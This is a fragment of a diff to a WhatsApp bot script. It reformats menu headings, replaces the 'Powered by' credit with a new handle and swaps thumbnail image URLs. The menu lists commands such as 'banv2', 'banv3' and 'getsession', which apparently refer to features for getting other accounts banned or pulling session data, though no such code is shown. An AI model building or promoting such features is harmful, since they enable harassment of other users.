 > 𝐛𝐚𝐧𝐯𝟐 ◁️❄️🕷️
 > 𝐛𝐚𝐧𝐯𝟑 ◁️❄️🕷️
@@ -2938,7 +2936,7 @@ ${readmore}
 > 𝐮𝐧𝐛𝐚𝐧𝐯𝟒 ◁️❄️🕷️
 > 𝐮𝐧𝐛𝐚𝐧𝐯𝟒 ◁️❄️🕷️
 
-╰⭑➤➤⭑➤➤⭑➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
+╰⭑➤➤⭑➤➤⭑➤ *ᴏᴡɴᴇʀ ᴍᴇɴᴜ*
 > 𝐠𝐞𝐭𝐬𝐞𝐬𝐬𝐢𝐨𝐧 ◁️❄️🕷️
 > 𝐝𝐞𝐥𝐞𝐭𝐞𝐬𝐞𝐬𝐬𝐢𝐨𝐧 ◁️❄️🕷️
 > 𝐣𝐨𝐢𝐧 ◁️❄️🕷️
@@ -2958,7 +2956,7 @@ ${readmore}
 > 𝐚𝐝𝐝𝐨𝐰𝐧𝐞𝐫 ◁️❄️🕷️
 > 𝐝𝐞𝐥𝐨𝐰𝐧𝐞𝐫 ◁️❄️🕷️
 
-╰⭑➤➤⭑➤➤⭑➤ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
+╰⭑➤➤⭑➤➤⭑➤ *ɢʀᴏᴜᴘ ᴍᴇɴᴜ*
 > 𝐜𝐥𝐨𝐬𝐞𝐭𝐢𝐦𝐞 ◁️❄️🕷️
 > 𝐨𝐩𝐞𝐧𝐭𝐢𝐦𝐞 ◁️❄️🕷️
 > 𝐤𝐢𝐜𝐤 ◁️❄️🕷️
@@ -2976,7 +2974,7 @@ ${readmore}
 > 𝐫𝐞𝐯𝐨𝐤𝐞 ◁️❄️🕷️
 > 𝐥𝐢𝐬𝐭𝐨𝐧𝐥𝐢𝐧𝐞 ◁️❄️🕷️
 
-╰⭑➤➤⭑➤➤⭑➤ ᴍᴀɪɴ ᴍᴇɴᴜ
+╰⭑➤➤⭑➤➤⭑➤ *ᴍᴀɪɴ ᴍᴇɴᴜ*
 > 𝐦𝐞𝐧𝐮 ◁️❄️🕷️
 > 𝐛𝐮𝐲𝐩𝐫𝐞𝐦𝐢𝐮𝐦 ◁️❄️🕷️
 > 𝐫𝐮𝐧𝐭𝐢𝐦𝐞 ◁️❄️🕷️
@@ -3029,7 +3027,7 @@ ${readmore}
 > 𝐲𝐭𝐦𝐩𝟒 ◁️❄️🕷️
 > 𝐬𝐨𝐮𝐧𝐝𝟏 - 𝐬𝐨𝐮𝐧𝐝𝟏𝟔𝟏 ◁️❄️🕷️
 
-©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐒𝐭𝐢𝐧𝐠𝐞𝐫-𝐕𝟐`
+©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 ★彡[𝐇͜͡𝚲𝙓𝞝𝙍]彡★`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         text: xeonmenuoh,
@@ -3037,7 +3035,7 @@ if (typemenu === 'v1') {
                             externalAdReply: {
                                 title: botname,
                                 body: ownername,
-                                thumbnailUrl: 'https://i.ibb.co/WVjs0r4/IMG-20240906-WA0025.jpg',
+                                thumbnailUrl: 'https://i.ibb.co/qF53V71/image.jpg',
                                 sourceUrl: link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -3055,7 +3053,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://i.ibb.co/WVjs0r4/IMG-20240906-WA0025.jpg',
+      thumbnailUrl: 'https://i.ibb.co/qF53V71/image.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
